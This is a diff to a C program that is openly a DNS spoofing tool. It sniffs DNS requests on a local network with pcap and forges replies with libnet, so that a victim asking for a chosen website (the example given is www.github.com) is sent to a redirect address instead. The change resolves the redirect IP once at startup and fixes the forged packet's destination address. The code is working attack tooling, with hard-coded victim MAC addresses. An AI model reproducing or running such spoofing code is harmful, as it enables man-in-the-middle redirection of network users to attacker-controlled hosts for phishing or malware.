@@ -15,10 +15,11 @@
 #define COLOR_GREEN "\x1b[32m"
 #define COLOR_RESET "\x1b[0m"
 
-char *interface_name;   // Name of the interface on which sniffing will be done and through which fake packes will be sent eg. "wlo1"
-char *gateway_ip_addr;  // IP address of the gateway eg. "192.168.0.1"
-char *website_to_spoof; // Website which will be spoffed eg. "www.github.com"
-char *redirect_addr;    // Website url or ip address which will be send instead of the website's eg. "192.168.0.47" or "www.guthib.com"
+char *interface_name;      // Name of the interface on which sniffing will be done and through which fake packes will be sent eg. "wlo1"
+char *gateway_ip_addr;     // IP address of the gateway eg. "192.168.0.1"
+char *website_to_spoof;    // Website which will be spoffed eg. "www.github.com"
+char *redirect_addr;       // Website url or ip address which will be send instead of the website's eg. "192.168.0.47" or "www.guthib.com"
+uint32_t redirect_ip_addr; // IP address of the redirect_addr
 
 u_int8_t victim_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x01}; // TODO get this from ip address
 u_int8_t test_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x02};   // TODO get this from ip address
@@ -155,7 +156,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
     printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
     printf("Protocol: %d\n", ip_header->protocol);
     printf("Requested IP: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
-    requested_ip_addr = libnet_name2addr4(handler, redirect_addr, LIBNET_RESOLVE);
+    requested_ip_addr = redirect_ip_addr;
     printf("Changing to: %s\n", inet_ntoa(*(struct in_addr *)&requested_ip_addr));
     printf("DNS ID: %x\n", dns_id);
   }
@@ -220,8 +221,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
       60,
       IPPROTO_UDP,
       0, ////insert IP checksum value. have to check later
-      // ip_header->daddr,
-      0xc0a80025,
+      ip_header->daddr,
       ip_header->saddr,
       NULL, // insert payload
       0,    // insert length
@@ -295,6 +295,8 @@ int main(int argc, char **argv)
   gateway_ip_addr = argv[2];
   website_to_spoof = argv[3];
   redirect_addr = argv[4];
+
+  redirect_ip_addr = libnet_name2addr4(NULL, redirect_addr, LIBNET_RESOLVE);
 
   pthread_t pth1, pth2;
 
